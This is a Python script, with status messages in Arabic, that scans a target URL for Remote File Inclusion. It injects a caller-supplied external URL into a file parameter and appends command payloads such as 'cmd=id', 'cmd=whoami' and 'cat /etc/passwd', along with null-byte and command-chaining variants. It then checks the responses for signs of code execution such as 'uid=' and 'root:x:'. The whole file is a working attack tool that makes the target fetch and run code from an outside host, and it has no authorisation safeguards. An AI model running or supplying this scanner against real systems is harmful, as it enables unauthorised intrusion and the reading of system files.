import requests
import time

def scan_rfi(url, external_url, param="file"):
    payloads = [
        f"{external_url}",
        f"{external_url}?cmd=id",
        f"{external_url}?cmd=whoami",
        f"{external_url}?cmd=uname -a",
        f"{external_url}?cmd=pwd",
        f"{external_url}?cmd=ls",
        f"{external_url}?cmd=cat /etc/passwd",
        f"{external_url}%00",
        f"{external_url}?;id",
        f"{external_url}?&id",
        f"{external_url}?cmd=/bin/cat /etc/passwd"
    ]

    indicators = [
        "uid=",  
        "root:",  
        "server at",  
        "document root",  
        "REMOTE_ADDR",  
        "HTTP_USER_AGENT",
        "bin/bash",  
        "root:x:",  
        "apache",  
        "www-data",  
        "/home/",  
        "/var/www/",  
        "localhost",  
        "USER=",
        "PWD="
    ]

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    for payload in payloads:
        target_url = f"{url}?{param}={payload}"
        try:
            print(f"[*] تجربة الحمولة: {payload}")
            start_time = time.time()
            response = requests.get(target_url, headers=headers)
            response_time = time.time() - start_time

            for indicator in indicators:
                if indicator.lower() in response.text.lower():
                    print(f"[+] تم اكتشاف ثغرة RFI عند: {target_url} - المؤشر: {indicator}")
                    print(f"وقت الاستجابة: {response_time:.2f} ثانية")
                    break
            else:
                print(f"[-] لم يتم اكتشاف ثغرة RFI عند: {target_url} - وقت الاستجابة: {response_time:.2f} ثانية")

        except requests.exceptions.RequestException as e:
            print(f"[!] خطأ أثناء الاتصال بـ {target_url}: {e}")
